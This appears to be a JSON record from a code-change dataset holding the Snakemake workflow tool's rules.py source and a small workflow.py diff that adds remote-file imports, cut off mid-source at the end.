self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"},"\/snakemake\/workflow.py":{"changes":[{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]},{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in 